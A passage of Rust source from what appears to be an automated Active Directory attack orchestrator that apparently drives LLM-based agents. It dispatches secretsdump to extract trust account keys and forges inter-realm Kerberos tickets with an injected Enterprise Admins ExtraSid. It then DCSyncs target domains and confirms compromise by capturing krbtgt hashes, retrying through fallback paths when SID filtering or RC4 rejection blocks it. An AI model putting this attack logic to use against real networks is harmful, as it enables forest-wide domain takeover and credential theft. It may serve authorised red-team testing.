                                                .and_then(|v| v.as_str())
                                                .unwrap_or("");
                                            let dom = h
                                                .get("domain")
                                                .and_then(|v| v.as_str())
                                                .unwrap_or("");
                                            let htype = h
                                                .get("hash_type")
                                                .and_then(|v| v.as_str())
                                                .unwrap_or("");
                                            user.eq_ignore_ascii_case("krbtgt")
                                                && dom.to_lowercase() == parent_lower
                                                && htype.eq_ignore_ascii_case("ntlm")
                                        })
                                    })
                                    .unwrap_or(false);
                                let tail_for_log: String = exec_result
                                    .output
                                    .chars()
                                    .rev()
                                    .take(2000)
                                    .collect::<String>()
                                    .chars()
                                    .rev()
                                    .collect();
                                if has_parent_krbtgt {
                                    info!(
                                        parent_domain = %parent_domain_bg,
                                        "raise_child compromised parent — marking exploited"
                                    );
                                    let _ = dispatcher_bg
                                        .state
                                        .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                                        .await;
                                    let techniques =
                                        vec!["T1134.005".to_string(), "T1003.006".to_string()];
                                    let event_id = format!(
                                        "evt-raise-child-{}",
                                        &uuid::Uuid::new_v4().simple().to_string()[..8]
                                    );
                                    let event = serde_json::json!({
                                        "id": event_id,
                                        "timestamp": chrono::Utc::now().to_rfc3339(),
                                        "source": "trust_automation",
                                        "description": format!(
                                            "Child-to-parent ExtraSid escalation: {} \u{2192} {} via raiseChild",
                                            child_domain_bg, parent_domain_bg
                                        ),
                                        "mitre_techniques": techniques,
                                    });
                                    let _ = dispatcher_bg
                                        .state
                                        .persist_timeline_event(
                                            &dispatcher_bg.queue,
                                            &event,
                                            &techniques,
                                        )
                                        .await;
                                } else {
                                    warn!(
                                        parent_domain = %parent_domain_bg,
                                        output_tail = %tail_for_log,
                                        "raise_child completed but no parent krbtgt observed — NOT marking exploited"
                                    );
                                }
                            }
                            Err(e) => {
                                warn!(
                                    err = %e,
                                    child_domain = %child_domain_bg,
                                    parent_domain = %parent_domain_bg,
                                    "raise_child dispatch errored"
                                );
                            }
                        }
                    });
                }
            }
        }

        // Extract trust keys for known cross-forest trusts
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                // Collect trust work with per-trust source domain:
                // use a dominated domain that has a known DC (excluding the trust target).
                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. FOREIGNDOMAIN$)
                // live on the forest root DC, not child domain DCs. A secretsdump with
                // -just-dc-user FOREIGNDOMAIN$ against a child DC returns nothing.
                let extract_work: Vec<(String, String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_cross_forest())
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in a dominated source domain (not the foreign trust target).
                        // Prefer the forest root (fewest domain parts) since trust accounts
                        // are stored on the forest root DC.
                        let (source_domain, dc_ip) = state
                            .domain_controllers
                            .iter()
                            .filter(|(domain, _)| {
                                domain.to_lowercase() != trust.domain.to_lowercase()
                                    && state.dominated_domains.contains(&domain.to_lowercase())
                            })
                            .min_by_key(|(domain, _)| domain.split('.').count())
                            .map(|(d, ip)| (d.clone(), ip.clone()))?;
                        Some((
                            key,
                            trust.flat_name.clone(),
                            trust.domain.clone(),
                            dc_ip,
                            source_domain,
                        ))
                    })
                    .collect();
                // Prefer plaintext admin credential (domain-agnostic; refined per-trust below).
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                for (key, flat_name, trust_domain, dc_ip, source_domain) in extract_work {
                    // Find admin hash specifically for this trust's source domain.
                    // DA is typically achieved via hash-based attacks like secretsdump,
                    // so admin creds often only exist as hashes, not plaintext passwords.
                    let admin_hash = if admin_cred.is_none() {
                        let s = dispatcher.state.read().await;
                        s.hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == source_domain.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned()
                    } else {
                        None
                    };

                    // Build credential payload from either plaintext cred or NTLM hash
                    let cred_payload: Option<(String, String, serde_json::Value)> = if let Some(
                        ref cred,
                    ) =
                        admin_cred
                    {
                        Some((
                            cred.username.clone(),
                            cred.domain.clone(),
                            json!({
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            }),
                        ))
                    } else if let Some(ref hash) = admin_hash {
                        Some((
                            hash.username.clone(),
                            source_domain.clone(),
                            json!({
                                "username": hash.username,
                                "domain": source_domain,
                            }),
                        ))
                    } else {
                        debug!(
                            trust_domain = %trust_domain,
                            source_domain = %source_domain,
                            "No admin cred/hash for source domain — deferring trust key extraction"
                        );
                        continue;
                    };

                    let (_, domain, cred_json) = cred_payload.unwrap();
                    // secretsdump -just-dc-user FABRIKAM$ to get trust key
                    let trust_account = trust_account_name(&flat_name);
                    let mut payload = json!({
                        "technique": "secretsdump",
                        "target_ip": dc_ip,
                        "domain": domain,
                        "just_dc_user": trust_account,
                        "credential": cred_json,
                        "reason": format!("extract trust key for {}", trust_domain),
                    });
                    if let Some(ref hash) = admin_hash {
                        payload["hash_value"] = json!(hash.hash_value);
                    }

                    match dispatcher
                        .throttled_submit("credential_access", "credential_access", payload, 2)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                trust_account = %trust_account,
                                trust_domain = %trust_domain,
                                source_domain = %source_domain,
                                auth = if admin_cred.is_some() { "password" } else { "hash" },
                                "Trust key extraction dispatched"
                            );
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                .await;
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(err = %e, "Failed to dispatch trust key extraction")
                        }
                    }
                }
            }
        }

        // Follow trust keys (inter-realm ticket + foreign secretsdump)
        //
        // The deterministic forge uses only the trust key + SIDs (already on
        // each TrustFollowWork item); admin creds are no longer needed here.
        let work: Vec<TrustFollowWork> = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            // Build lookup of known trust flat names → TrustInfo so we only
            // process actual trust account hashes, not random machine accounts.
            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
                state
                    .trusted_domains
                    .values()
                    .map(|t| (t.flat_name.to_uppercase(), t))
                    .collect();

            let items = state
                .hashes
                .iter()
                .filter_map(|hash| {
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    let netbios = hash.username.trim_end_matches('$').to_uppercase();

                    // Resolve source domain — fall back to first dominated domain
                    // with a DC when secretsdump output lacks domain prefix
                    let source_domain = if hash.domain.is_empty() {
                        state
                            .domain_controllers
                            .keys()
                            .find(|d| state.dominated_domains.contains(&d.to_lowercase()))
                            .cloned()
                            .unwrap_or_default()
                    } else {
                        hash.domain.clone()
                    };
                    if source_domain.is_empty() {
                        return None;
                    }
                    let source_lower = source_domain.to_lowercase();

                    // Resolve target FQDN: prefer explicit TrustInfo from LDAP
                    // enumeration, else derive from known domains where the
                    // NetBIOS label matches and the FQDN is not the source
                    // (filters out same-domain machine accounts).
                    let target_domain = if let Some(t) = trust_by_flat.get(&netbios) {
                        t.domain.clone()
                    } else {
                        state
                            .domain_controllers
                            .keys()
                            .chain(state.dominated_domains.iter())
                            .find(|d| {
                                let dl = d.to_lowercase();
                                dl != source_lower
                                    && d.split('.')
                                        .next()
                                        .map(|label| label.to_uppercase() == netbios)
                                        .unwrap_or(false)
                            })
                            .cloned()?
                    };

                    let dedup_key = format!(
                        "trust_follow:{}:{}",
                        source_lower,
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // Use resolve_dc_ip so we fall back to the hosts table when
                    // domain_controllers lacks an explicit entry for the foreign
                    // domain — common for cross-forest trusts where the foreign
                    // DC is only known via host scan, not LDAP enumeration.
                    let target_dc_ip = state.resolve_dc_ip(&target_domain);

                    let source_domain_sid = state
                        .domain_sids
                        .get(&source_domain.to_lowercase())
                        .cloned();
                    let target_domain_sid = state
                        .domain_sids
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        source_domain,
                        target_domain,
                        target_dc_ip,
                        source_domain_sid,
                        target_domain_sid,
                    })
                })
                .collect();

            items
        };

        for item in work {
            let vuln_id = forest_trust_vuln_id(&item.source_domain, &item.target_domain);

            // Defer dispatch when the target DC IP is unknown: impacket needs
            // a routable -target-ip for both create_inter_realm_ticket and the
            // forge-and-present secretsdump fallback. Passing the bare domain
            // string fails fast and burns the dedup key. Re-tick in 30s and
            // let host scans / trust enum populate the DC entry first.
            let target_dc_ip = match item.target_dc_ip.clone() {
                Some(ip) => ip,
                None => {
                    debug!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Deferring forest trust escalation — target DC IP unresolved"
                    );
                    continue;
                }
            };
            let trust_target = target_dc_ip.clone();
            {
                let mut details = std::collections::HashMap::new();
                details.insert(
                    "source_domain".into(),
                    serde_json::Value::String(item.source_domain.clone()),
                );
                details.insert(
                    "target_domain".into(),
                    serde_json::Value::String(item.target_domain.clone()),
                );
                details.insert(
                    "trust_account".into(),
                    serde_json::Value::String(item.hash.username.clone()),
                );
                details.insert(
                    "note".into(),
                    serde_json::Value::String(format!(
                        "Forest trust escalation via {} trust key — inter-realm ticket + secretsdump",
                        item.hash.username
                    )),
                );
                let vuln = ares_core::models::VulnerabilityInfo {
                    vuln_id: vuln_id.clone(),
                    vuln_type: "forest_trust_escalation".to_string(),
                    target: trust_target,
                    discovered_by: "trust_automation".to_string(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 1,
                };
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // Skip self-referential trust (source == target)
            if item.source_domain.to_lowercase() == item.target_domain.to_lowercase() {
                debug!(
                    source = %item.source_domain,
                    target = %item.target_domain,
                    "Skipping self-referential trust escalation"
                );
                continue;
            }

            // Suppress the ExtraSid forge when the trust has SID filtering
            // active. ticketer adds Enterprise Admins (RID 519) via
            // `--extra-sid` to satisfy DCSync — but a SID-filtered forest
            // trust strips RID<1000 SIDs from the cross-realm PAC, and the
            // target KDC returns rpc_s_access_denied. Burn the dedup so this
            // doomed dispatch can't loop, mark the vuln exploited as a
            // strategic choice, and wake the cross-forest fallback paths
            // (ACL/MSSQL/FSP) to take over.
            {
                let state = dispatcher.state.read().await;
                if is_filtered_inter_forest_trust(&state, &item.source_domain, &item.target_domain)
                {
                    info!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Suppressing forge_inter_realm_and_dump — SID filtering on cross-forest trust would reject ExtraSid; waking fallbacks"
                    );
                    drop(state);
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                        .await;
                    wake_cross_forest_fallbacks(&dispatcher, &item.target_domain).await;

                    // Dispatch `create_inter_realm_ticket` so downstream Kerberos-capable
                    // tools (e.g. bloodyad with -k) have a valid ccache for the target
                    // forest. SID filtering blocks ExtraSid-based DCSync, but the forged
                    // TGT still allows Kerberos LDAP bind as Administrator. The tool writes
                    // Administrator.ccache in a tempdir; we persist the full path to Redis
                    // via `publish_kerberos_ticket` so the credential resolver can find it.
                    {
                        let dispatcher_bg = dispatcher.clone();
                        let source_domain_bg = item.source_domain.clone();
                        let target_domain_bg = item.target_domain.clone();
                        let trust_key_bg = item.hash.hash_value.clone();
                        let aes_key_bg = item.hash.aes_key.clone();
                        let source_domain_sid_bg = {
                            let s = dispatcher.state.read().await;
                            s.domain_sids
                                .get(&item.source_domain.to_lowercase())
                                .cloned()
                        };
                        tokio::spawn(async move {
                            dispatch_create_inter_realm_ticket(
                                &dispatcher_bg,
                                &source_domain_bg,
                                &target_domain_bg,
                                &trust_key_bg,
                                aes_key_bg.as_deref(),
                                source_domain_sid_bg.as_deref(),
                            )
                            .await;
                        });
                    }
                    continue;
                }
            }

            // Forge-and-present the inter-realm TGT as a deterministic worker
            // task — NOT an LLM task. Both `create_inter_realm_ticket` and
            // `secretsdump_kerberos` run sequentially on the same worker via
            // `expand_technique_task`, so the ccache file produced by ticketer
            // is on the same filesystem when secretsdump reads it.
            //
            // Routing through the LLM here would launder deterministic values
            // (NT hash, AES key, SIDs) through token generation — the LLM
            // would have to copy them out of the rendered prompt into tool
            // call args, where they get dropped, typo'd, or omitted. The
            // orchestrator already owns every input; deliver them directly.
            //
            // Resolve the target DC hostname so Kerberos auth can match the
            // SPN baked into the ticket. Falls back to the IP, which works
            // when the worker can reverse-resolve via DNS.
            let target_dc_hostname = {
                let s = dispatcher.state.read().await;
                s.hosts
                    .iter()
                    .find(|h| h.ip == target_dc_ip && !h.hostname.is_empty())
                    .map(|h| h.hostname.clone())
                    .or_else(|| {
                        s.hosts
                            .iter()
                            .find(|h| {
                                (h.is_dc || h.detect_dc())
                                    && h.hostname.to_lowercase().ends_with(&format!(
                                        ".{}",
                                        item.target_domain.to_lowercase()
                                    ))
                            })
                            .map(|h| h.hostname.clone())
                    })
                    .unwrap_or_else(|| target_dc_ip.clone())
            };

            // ticketer writes <username>.ccache in the worker cwd; the
            // following secretsdump_kerberos call reads it via KRB5CCNAME.
            let ticket_username = "Administrator";
            let ticket_path = format!("{ticket_username}.ccache");

            // Resolve missing source SID via lookupsid against the source
            // DC. ticketer.py needs `--domain-sid` for the source realm to
            // build a valid PAC; without it the resulting ticket gets
            // rejected by the target KDC. We have DA on the source domain
            // (cross-forest forge only fires after DA), so SAMR lookupsid
            // works with either a password cred or admin NTLM hash.
            let source_domain_sid = if item.source_domain_sid.is_some() {
                item.source_domain_sid.clone()
            } else {
                let (source_dc_ip, src_cred, src_hash) = {
                    let s = dispatcher.state.read().await;
                    let src_lower = item.source_domain.to_lowercase();
                    let dc = s.resolve_dc_ip(&item.source_domain);
                    let cred = s
                        .credentials
                        .iter()
                        .find(|c| {
                            c.is_admin
                                && !c.password.is_empty()
                                && c.domain.to_lowercase() == src_lower
                        })
                        .cloned();
                    let h = s
                        .hashes
                        .iter()
                        .find(|h| {
                            h.username.to_lowercase() == "administrator"
                                && h.domain.to_lowercase() == src_lower
                                && h.hash_type.to_uppercase() == "NTLM"
                        })
                        .cloned();
                    (dc, cred, h)
                };
                let resolved = if let Some(ref dc_ip) = source_dc_ip {
                    super::golden_ticket::resolve_domain_sid(
                        &item.source_domain,
                        dc_ip,
                        src_cred.as_ref(),
                        src_hash.as_ref(),
                    )
                    .await
                } else {
                    None
                };
                if let Some((sid, admin_name)) = resolved {
                    info!(
                        source_domain = %item.source_domain,
                        sid = %sid,
                        "Resolved source domain SID for cross-forest forge"
                    );
                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
                    let reader = ares_core::state::RedisStateReader::new(op_id);
                    let mut conn = dispatcher.queue.connection();
                    let src_lower = item.source_domain.to_lowercase();
                    let _ = reader.set_domain_sid(&mut conn, &src_lower, &sid).await;
                    if let Some(ref name) = admin_name {
                        let _ = reader.set_admin_name(&mut conn, &src_lower, name).await;
                    }
                    {
                        let mut state = dispatcher.state.write().await;
                        state.domain_sids.insert(src_lower.clone(), sid.clone());
                        if let Some(ref name) = admin_name {
                            state.admin_names.insert(src_lower, name.clone());
                        }
                    }
                    Some(sid)
                } else {
                    warn!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        "Could not resolve source SID — deferring cross-forest forge"
                    );
                    None
                }
            };
            if source_domain_sid.is_none() {
                continue;
            }

            // For child→parent forges we MUST inject the parent's Enterprise
            // Admins SID (RID 519) as ExtraSid; without it the parent KDC
            // issues a TGS but DRSUAPI on the parent DC rejects the
            // replication call as `rpc_s_access_denied` and nxc dumps zero
            // hashes (exit 0, hiding the failure).
            //
            // For cross-forest forges, the target domain SID is required for
            // ticketer.py to build a PAC the target KDC will accept (without
            // it the inter-realm TGT is rejected and forge_inter_realm_and_dump
            // returns 0 hashes, locking dedup permanently). Resolve the target
            // SID on-demand via lookupsid against the target DC using source
            // admin creds (cross-trust SAMR works post-DA) when it isn't
            // cached. Defer dispatch (no dedup mark) when resolution fails so
            // the next 30s tick can retry once sid_enumeration populates it
            // via lsaquery.
            let source_l = item.source_domain.to_lowercase();
            let target_l = item.target_domain.to_lowercase();
            let is_child_to_parent =
                source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
            let needs_target_sid = source_l != target_l;
            let target_domain_sid: Option<String> =
                if !needs_target_sid || item.target_domain_sid.is_some() {
                    item.target_domain_sid.clone()
                } else {
                    let (src_cred, src_hash) = {
                        let s = dispatcher.state.read().await;
                        let src_lower = item.source_domain.to_lowercase();
                        let cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == src_lower
                            })
                            .cloned();
                        let h = s
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == src_lower
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned();
                        (cred, h)
                    };
                    let resolved = super::golden_ticket::resolve_domain_sid(
                        &item.target_domain,
                        &target_dc_ip,
                        src_cred.as_ref(),
                        src_hash.as_ref(),
                    )
                    .await;
                    if let Some((sid, admin_name)) = resolved {
                        let label = if is_child_to_parent {
                            "Resolved parent domain SID for child→parent forge ExtraSid"
                        } else {
                            "Resolved target domain SID for cross-forest forge"
                        };
                        info!(
                            target_domain = %item.target_domain,
                            sid = %sid,
                            "{}", label
                        );
                        let op_id = { dispatcher.state.read().await.operation_id.clone() };
                        let reader = ares_core::state::RedisStateReader::new(op_id);
                        let mut conn = dispatcher.queue.connection();
                        let tgt_lower = item.target_domain.to_lowercase();
                        let _ = reader.set_domain_sid(&mut conn, &tgt_lower, &sid).await;
                        if let Some(ref name) = admin_name {
                            let _ = reader.set_admin_name(&mut conn, &tgt_lower, name).await;
                        }
                        {
                            let mut state = dispatcher.state.write().await;
                            state.domain_sids.insert(tgt_lower.clone(), sid.clone());
                            if let Some(ref name) = admin_name {
                                state.admin_names.insert(tgt_lower, name.clone());
                            }
                        }
                        Some(sid)
                    } else {
                        let label = if is_child_to_parent {
                            "Could not resolve parent SID — deferring child→parent forge"
                        } else {
                            "Could not resolve target SID — deferring cross-forest forge"
                        };
                        warn!(
                            source = %item.source_domain,
                            target = %item.target_domain,
                            target_dc_ip = %target_dc_ip,
                            "{}", label
                        );
                        None
                    }
                };
            if needs_target_sid && target_domain_sid.is_none() {
                continue;
            }

            // Wait for AES256 to upsert before dispatching cross-forest forge.
            // secretsdump runs twice (NTLM-only first, then -aes-types) and the
            // second call typically lands ~60-90s after NTLM. If we dispatch
            // before AES arrives, Win2016+ targets reject the RC4-only ticket
            // with KDC_ERR_TGT_REVOKED and forge_inter_realm yields zero hashes
            // — locking dedup on a doomed dispatch.
            //
            // Re-read state.hashes for an AES-equipped variant of this trust
            // account; if present, use it. If absent, defer up to ~3 min so the
            // second secretsdump can land. After that, dispatch with NTLM-only
            // as a last resort (some target DCs accept RC4 still, and the
            // wake_cross_forest_fallbacks path is the real safety net).
            let resolved_aes_key: Option<String> = if needs_target_sid {
                let from_state = {
                    let s = dispatcher.state.read().await;
                    s.hashes
                        .iter()
                        .find(|h| {
                            h.username.eq_ignore_ascii_case(&item.hash.username)
                                && h.domain.eq_ignore_ascii_case(&item.hash.domain)
                                && h.aes_key.is_some()
                        })
                        .and_then(|h| h.aes_key.clone())
                };
                let aes = item.hash.aes_key.clone().or(from_state);
                if aes.is_none() {
                    let attempts = {
                        let mut state = dispatcher.state.write().await;
                        let count = state
                            .forge_aes_defers
                            .entry(item.dedup_key.clone())
                            .or_insert(0);
                        *count += 1;
                        *count
                    };
                    const MAX_AES_DEFERS: u32 = 6;
                    if attempts <= MAX_AES_DEFERS {
                        debug!(
                            source = %item.source_domain,
                            target = %item.target_domain,
                            trust_account = %item.hash.username,
                            attempts,
                            "Deferring cross-forest forge — AES256 not yet upserted on trust hash"
                        );
                        continue;
                    }
                    warn!(
                        source = %item.source_domain,
                        target = %item.target_domain,
                        trust_account = %item.hash.username,
                        "Dispatching cross-forest forge with NTLM-only after AES wait exhausted"
                    );
                    None
                } else {
                    aes
                }
            } else {
                item.hash.aes_key.clone()
            };

            // Build args for the combined `forge_inter_realm_and_dump` tool.
            // This single tool runs impacket-ticketer + impacket-secretsdump
            // sequentially in one worker invocation (shared tempdir as cwd),
            // so the .ccache produced by ticketer is on the same filesystem
            // when secretsdump reads it. Two split dispatch_tool calls would
            // land on different worker pods with no shared FS.
            let mut tool_args = json!({
                "source_domain": &item.source_domain,
                "target_domain": &item.target_domain,
                "trust_key": &item.hash.hash_value,
                "username": ticket_username,
                // `target` is the DC hostname (or IP fallback) for the SPN
                // baked into the ticket; `dc_ip` is the routable IP used
                // for impacket-secretsdump's `-dc-ip`.
                "target": &target_dc_hostname,
                "dc_ip": &target_dc_ip,
            });
            if let Some(ref sid) = source_domain_sid {
                tool_args["source_sid"] = json!(sid);
            }
            if let Some(ref sid) = target_domain_sid {
                tool_args["target_sid"] = json!(sid);
            }
            // AES256 trust key — required for Win2016+ target DCs which
            // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
            // resolved_aes_key prefers item.hash.aes_key, then re-reads
            // state.hashes for an AES-equipped variant (handles the race
            // where secretsdump's second pass upserts AES after work was
            // collected).
            if let Some(ref aes) = resolved_aes_key {
                tool_args["aes_key"] = json!(aes);
            }
            // For child→parent trusts (intra-forest), inject parent's
            // Enterprise Admins SID (RID 519). SID filtering blocks
            // ExtraSID across forest trusts, so only emit on intra-forest.
            // The defer above guarantees target_domain_sid is Some here
            // when is_child_to_parent.
            if is_child_to_parent {
                if let Some(ref tsid) = target_domain_sid {
                    tool_args["extra_sid"] = json!(format!("{tsid}-519"));
                }
            }
            let _ = ticket_path; // ccache path is internal to the tool
            let _ = trust_target;

            let call = ToolCall {
                id: format!("forge_inter_realm_{}", uuid::Uuid::new_v4().simple()),
                name: "forge_inter_realm_and_dump".to_string(),
                arguments: tool_args,
            };
            let task_id = format!(
                "trust_forge_{}",
                &uuid::Uuid::new_v4().simple().to_string()[..12]
            );

            // Mark dedup BEFORE spawning so the next 30s tick doesn't
            // re-dispatch the same trust while the forge is running.
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;

            info!(
                task_id = %task_id,
                trust_account = %item.hash.username,
                source_domain = %item.source_domain,
                target_domain = %item.target_domain,
                has_source_sid = source_domain_sid.is_some(),
                has_target_sid = target_domain_sid.is_some(),
                has_aes = resolved_aes_key.is_some(),
                "Cross-forest forge dispatched (direct tool, no LLM)"
            );

            let dispatcher_bg = dispatcher.clone();
            let source_domain_bg = item.source_domain.clone();
            let target_domain_bg = item.target_domain.clone();
            let trust_account_bg = item.hash.username.clone();
            let vuln_id_bg = vuln_id.clone();
            let dedup_key_bg = item.dedup_key.clone();
            let trust_key_bg = item.hash.hash_value.clone();
            let aes_key_bg = resolved_aes_key.clone();
            let source_domain_sid_bg = source_domain_sid.clone();
            tokio::spawn(async move {
                let result = dispatcher_bg
                    .llm_runner
                    .tool_dispatcher()
                    .dispatch_tool("privesc", &task_id, &call)
                    .await;
                // Clear dedup on failure so the next 30s tick can retry once
                // a fresh trust key, AES key, or SID becomes available.
                let clear_dedup = || async {
                    dispatcher_bg
                        .state
                        .write()
                        .await
                        .unmark_processed(DEDUP_TRUST_FOLLOW, &dedup_key_bg);
                    let _ = dispatcher_bg
                        .state
                        .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &dedup_key_bg)
                        .await;
                };
                match result {
                    Ok(exec_result) => {
                        if let Some(err) = exec_result.error.as_ref() {
                            let tail: String = exec_result
                                .output
                                .chars()
                                .rev()
                                .take(2000)
                                .collect::<String>()
                                .chars()
                                .rev()
                                .collect();
                            warn!(
                                err = %err,
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                trust_account = %trust_account_bg,
                                output_tail = %tail,
                                "forge_inter_realm_and_dump returned error — clearing dedup for retry"
                            );
                            clear_dedup().await;
                            return;
                        }
                        // Verify target compromise — only mark exploited
                        // when we actually observe the target krbtgt hash
                        // in the dispatch_tool discoveries.
                        let target_lower = target_domain_bg.to_lowercase();
                        let has_target_krbtgt = exec_result
                            .discoveries
                            .as_ref()
                            .and_then(|d| d.get("hashes"))
                            .and_then(|h| h.as_array())
                            .map(|hashes| {
                                hashes.iter().any(|h| {
                                    let user =
                                        h.get("username").and_then(|v| v.as_str()).unwrap_or("");
                                    let dom =
                                        h.get("domain").and_then(|v| v.as_str()).unwrap_or("");
                                    let htype =
                                        h.get("hash_type").and_then(|v| v.as_str()).unwrap_or("");
                                    user.eq_ignore_ascii_case("krbtgt")
                                        && dom.to_lowercase() == target_lower
                                        && htype.eq_ignore_ascii_case("ntlm")
                                })
                            })
                            .unwrap_or(false);
                        if has_target_krbtgt {
                            info!(
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                "Cross-forest forge compromised target — marking exploited"
                            );
                            let _ = dispatcher_bg
                                .state
                                .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                                .await;
                            let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
                            let event_id = format!(
                                "evt-trust-{}",
                                &uuid::Uuid::new_v4().simple().to_string()[..8]
                            );
                            let event = serde_json::json!({
                                "id": event_id,
                                "timestamp": chrono::Utc::now().to_rfc3339(),
                                "source": "trust_automation",
                                "description": format!(
                                    "Forest trust escalation: {} \u{2192} {} via trust key {}",
                                    source_domain_bg, target_domain_bg, trust_account_bg
                                ),
                                "mitre_techniques": techniques,
                            });
                            let _ = dispatcher_bg
                                .state
                                .persist_timeline_event(&dispatcher_bg.queue, &event, &techniques)
                                .await;
                        } else {
                            // Tool ran cleanly but no target krbtgt landed in
                            // discoveries — this is a deterministic failure
                            // (SID filtering, denied permissions, or wrong
                            // forest) that won't change on the next 30s tick.
                            // Keep dedup MARKED so we don't relitigate the
                            // doomed forge in a tight loop, mark the trust
                            // vuln exploited so the operation moves on, and
                            // wake the cross-forest fallback paths
                            // (ACL/MSSQL/FSP) which can still compromise the
                            // target forest without ExtraSid.
                            //
                            // Surface tool stdout tail + a hash-count summary so
                            // post-mortem can distinguish silent nxc failure
                            // (empty output) from auth-denied (nxc printed
                            // STATUS_LOGON_FAILURE / rpc_s_access_denied) from
                            // partial dumps (got hashes but no krbtgt — usually
                            // a cross-forest no-ExtraSid case where the target
                            // KDC issued a TGS but DRSUAPI rejected replication).
                            let tail: String = exec_result
                                .output
                                .chars()
                                .rev()
                                .take(2000)
                                .collect::<String>()
                                .chars()
                                .rev()
                                .collect();
                            let hash_count = exec_result
                                .discoveries
                                .as_ref()
                                .and_then(|d| d.get("hashes"))
                                .and_then(|h| h.as_array())
                                .map(|a| a.len())
                                .unwrap_or(0);
                            warn!(
                                source_domain = %source_domain_bg,
                                target_domain = %target_domain_bg,
                                hash_count,
                                output_tail = %tail,
                                "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks (vuln NOT marked exploited; only target krbtgt capture proves compromise)"
                            );
                            let _ = vuln_id_bg; // intentionally unused — see comment above

                            // Dump-phase failure (SID filtering missed by
                            // is_filtered_inter_forest_trust, DRSUAPI denial
                            // despite a valid TGS, or any other reason DCSync
                            // returned 0 hashes) leaves the foreign forest
                            // attackable via Kerberos LDAP bind. Dispatch
                            // create_inter_realm_ticket so downstream tools
                            // (bloodyad -k, etc.) get a usable ccache. Without
                            // this, wake_cross_forest_fallbacks below is a
                            // no-op when no same-realm credential bound the
                            // ACL/foreign-group/cross-forest enums to the
                            // target — the case that left essos.local
                            // permanently un-attackable in op-20260502-013857.
                            {
                                let dispatcher_fb = dispatcher_bg.clone();
                                let source_domain_fb = source_domain_bg.clone();
                                let target_domain_fb = target_domain_bg.clone();
                                let trust_key_fb = trust_key_bg.clone();
                                let aes_key_fb = aes_key_bg.clone();
                                let source_domain_sid_fb = source_domain_sid_bg.clone();
                                tokio::spawn(async move {
                                    dispatch_create_inter_realm_ticket(
                                        &dispatcher_fb,
                                        &source_domain_fb,
                                        &target_domain_fb,
                                        &trust_key_fb,
                                        aes_key_fb.as_deref(),
                                        source_domain_sid_fb.as_deref(),
                                    )
                                    .await;
                                });
                            }

                            wake_cross_forest_fallbacks(&dispatcher_bg, &target_domain_bg).await;
                        }
                    }
                    Err(e) => {
                        warn!(
                            err = %e,
                            source_domain = %source_domain_bg,
                            target_domain = %target_domain_bg,
                            "forge_inter_realm_and_dump dispatch errored — clearing dedup for retry"
                        );
                        clear_dedup().await;
                    }
                }
            });
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    source_domain: String,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
    target_domain_sid: Option<String>,
}

/// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
///
/// Called from the suppression branch of `auto_trust_follow` when
